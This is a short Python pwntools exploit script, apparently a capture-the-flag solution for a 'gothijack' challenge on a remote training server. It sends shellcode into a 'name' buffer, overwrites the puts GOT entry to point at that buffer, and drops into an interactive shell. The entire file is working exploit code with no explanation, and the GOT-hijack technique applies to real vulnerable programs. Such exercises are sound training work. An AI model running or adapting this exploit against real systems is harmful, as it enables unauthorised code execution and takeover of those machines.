#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft
import pwnlib.elf

# init
c = remote('isc.taiwan-te.ch', 10003)
e =ELF('gothijack')

context.os='linux'
context.arch='amd64'

ans = asm(shellcraft.sh()) + 'A' * 16   # put shellcode to name
ans += str(e.got['puts']) + '\n'             # set to puts GOT
ans += p64(e.symbols['name']) + '\n'    # point GOT to name
c.send(ans)

c.interactive()
c.close()
